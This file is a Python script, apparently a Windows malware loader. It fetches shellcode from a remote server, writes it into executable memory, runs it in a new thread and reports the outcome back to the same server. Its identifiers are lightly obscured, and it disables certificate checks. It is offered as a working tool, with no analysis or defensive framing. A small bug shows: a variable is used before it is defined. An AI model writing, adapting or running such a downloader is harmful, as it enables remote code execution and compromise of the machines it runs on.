import ctypes as mill
import sys, requests as r
import urllib3
import io
import contextlib
import traceback
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import json
import requests
def send_status(url, data):
    try:
        headers = {'Content-Type': 'application/json'}
        requests.post(url, data=json.dumps(data), headers=headers, verify=False, timeout=5)
    except Exception:
        pass

def mi(little):   
    output = io.StringIO()
    print("Starting shellcode runner script")
    try:
        bmx = r.get(little, verify=False).content
        print(f"Downloaded shellcode of length: {len(bmx)}")
    except r.exceptions.RequestException as e:
        print(f"Error downloading file: {e}")
        if True:
            try:
                send_status('https://namsos.kornrnune.no/8b7c6/api/shellcode_output', {'status': 'error', 'message': str(e), 'output': output.getvalue()})
            except Exception:
                pass
        return

    mill.windll.kernel32.VirtualAlloc.restype = mill.c_void_p
    mill.windll.kernel32.CreateThread.argtypes = (
        mill.c_int, mill.c_int, mill.c_void_p, mill.c_int, mill.c_int, mill.POINTER(mill.c_int))

    try:
        print("Allocating memory for shellcode")
        spc = mill.windll.kernel32.VirtualAlloc(
            mill.c_int(0), mill.c_int(len(bmx)), mill.c_int(0x3000), mill.c_int(0x40))
        print(f"Memory allocated at address: {spc}")
        bf = (mill.c_char * len(bmx)).from_buffer_copy(bmx)
        mill.windll.kernel32.RtlMoveMemory(mill.c_void_p(spc), bf, mill.c_int(len(bmx)))
        print("Shellcode copied to allocated memory")
        hndl = mill.windll.kernel32.CreateThread(
            mill.c_int(0), mill.c_int(0), mill.c_void_p(spc), mill.c_int(0), mill.c_int(0),
            mill.pointer(mill.c_int(0)))
        print(f"Thread created with handle: {hndl}")

        mill.windll.kernel32.WaitForSingleObject(hndl, mill.c_uint32(0xffffffff))
        print("Shellcode executed successfully")
        if True:
            try:
                send_status('https://namsos.kornrnune.no/8b7c6/api/shellcode_output', {'status': 'success', 'message': 'Shellcode executed', 'output': output.getvalue()})
            except Exception:
                pass
    except Exception as e:
        print("Exception during shellcode execution:")
        traceback.print_exc()
        if True:
            try:
                send_status('https://namsos.kornrnune.no/8b7c6/api/shellcode_output', {'status': 'error', 'message': str(e), 'output': output.getvalue()})
            except Exception:
                pass

if __name__ == "__main__":
    little = "https://namsos.kornrnune.no/8b7c6/api/download_shellcode/shellcode_b2765240.bin"
    with contextlib.redirect_stdout(output):
        mi(little)
